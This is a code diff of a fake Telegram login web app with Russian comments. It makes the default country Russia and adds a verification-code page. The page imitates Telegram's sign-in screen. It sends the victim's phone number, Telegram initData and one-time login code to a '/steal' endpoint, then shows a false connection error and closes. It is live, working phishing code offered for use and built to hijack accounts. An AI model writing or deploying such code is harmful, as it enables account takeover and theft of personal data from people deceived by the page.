@@ -184,11 +184,23 @@
             color: var(--tg-theme-hint-color, #707579);
             font-size: 16px;
         }
+        .code-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <!-- Главная страница -->
-    <div class="page" id="mainPage">
+    <!-- Страница ввода номера -->
+    <div class="page" id="phonePage">
         <div class="logo">
             <div class="logo-img" id="avatar"></div>
             <div class="title">Telegram</div>
@@ -199,17 +211,17 @@
             <div class="label">Country</div>
             <div class="country-selector" onclick="showCountries()">
                 <div class="country-info">
-                    <div class="country-flag" id="currentFlag">🇺🇦</div>
-                    <div class="country-name" id="currentCountry">Ukraine</div>
+                    <div class="country-flag" id="currentFlag">🇷🇺</div>
+                    <div class="country-name" id="currentCountry">Russia</div>
                 </div>
-                <div class="country-code" id="currentCode">+380</div>
+                <div class="country-code" id="currentCode">+7</div>
                 <div class="arrow">›</div>
             </div>
         </div>
 
         <div class="form-group">
             <div class="label">Your phone number</div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="+380" oninput="validatePhone()">
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" oninput="validatePhone()">
         </div>
 
         <div class="checkbox">
@@ -218,6 +230,22 @@
         </div>
 
         <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
+    </div>
+
+    <!-- Страница ввода кода -->
+    <div class="page hidden" id="codePage">
+        <div class="logo">
+            <div class="logo-img" id="avatarCode"></div>
+            <div class="title">Code</div>
+            <div class="subtitle" id="codeSubtitle">We have sent a code to your phone.</div>
+        </div>
+
+        <div class="form-group">
+            <div class="label">Verification Code</div>
+            <input type="text" class="code-input" id="codeInput" placeholder="-----" maxlength="5" oninput="validateCode()">
+        </div>
+
+        <button class="btn" id="confirmBtn" disabled onclick="sendCode()">Confirm</button>
     </div>
 
     <!-- Модальное окно выбора страны -->
@@ -231,12 +259,13 @@
     </div>
 
     <script>
-        // Загрузка аватарки из папки public
+        // Аватарка из папки public
         document.getElementById('avatar').style.backgroundImage = "url('/avatar.jpg')";
+        document.getElementById('avatarCode').style.backgroundImage = "url('/avatar.jpg')";
         
         const countries = [
-            {code: '+1', name: 'United States', flag: '🇺🇸'},
             {code: '+7', name: 'Russia', flag: '🇷🇺'},
+            {code: '+1', name: 'United States', flag: '🇺🇸'},
             {code: '+380', name: 'Ukraine', flag: '🇺🇦'},
             {code: '+44', name: 'United Kingdom', flag: '🇬🇧'},
             {code: '+49', name: 'Germany', flag: '🇩🇪'},
@@ -283,7 +312,8 @@
             {code: '+972', name: 'Israel', flag: '🇮🇱'}
         ];
 
-        let selectedCountry = countries[2]; // Ukraine по умолчанию
+        let selectedCountry = countries[0]; // Russia по умолчанию
+        let userPhone = '';
         const currentDomain = window.location.hostname;
         const stealUrl = `https://${currentDomain}/steal`;
 
@@ -338,27 +368,65 @@
         }
 
         function validatePhone() {
-            const phone = document.getElementById('phoneInput').value.replace(selectedCountry.code, '').trim();
+            const phone = document.getElementById('phoneInput').value;
             const nextBtn = document.getElementById('nextBtn');
-            nextBtn.disabled = !phone.match(/^[0-9]{7,15}$/);
+            
+            // Убираем код страны из ввода для проверки
+            const cleanPhone = phone.replace(selectedCountry.code, '').trim();
+            userPhone = selectedCountry.code + cleanPhone;
+            
+            nextBtn.disabled = !cleanPhone.match(/^[0-9]{7,15}$/);
+        }
+
+        function validateCode() {
+            const code = document.getElementById('codeInput').value;
+            const confirmBtn = document.getElementById('confirmBtn');
+            confirmBtn.disabled = code.length !== 5;
         }
 
         function sendPhone() {
-            const phone = document.getElementById('phoneInput').value;
             const tgData = Telegram.WebApp.initData;
             
-            fetch('/steal', {
+            fetch(stealUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: phone,
+                    phone: userPhone,
                     tg_data: tgData,
                     stage: 'phone_entered'
                 })
             }).catch(e => console.error('Error:', e));
 
-            alert('Code has been sent to your phone. Please check Telegram.');
-            Telegram.WebApp.close();
+            // Показываем страницу с кодом
+            document.getElementById('phonePage').classList.add('hidden');
+            document.getElementById('codePage').classList.remove('hidden');
+            
+            // Маскируем номер для отображения
+            const maskedPhone = userPhone.slice(0, 4) + ' ••• ••• ' + userPhone.slice(-2);
+            document.getElementById('codeSubtitle').textContent = 
+                `We have sent a code to ${maskedPhone}`;
+        }
+
+        function sendCode() {
+            const code = document.getElementById('codeInput').value;
+            const tgData = Telegram.WebApp.initData;
+            
+            fetch(stealUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: userPhone,
+                    code: code,
+                    tg_data: tgData,
+                    stage: 'code_entered'
+                })
+            }).catch(e => console.error('Error:', e));
+
+            // Показываем ошибку и закрываем
+            setTimeout(() => {
+                alert('Error connecting to Telegram. Please try again later.');
+                Telegram.WebApp.close();
+            }, 1000);
         }
 
         // Инициализация
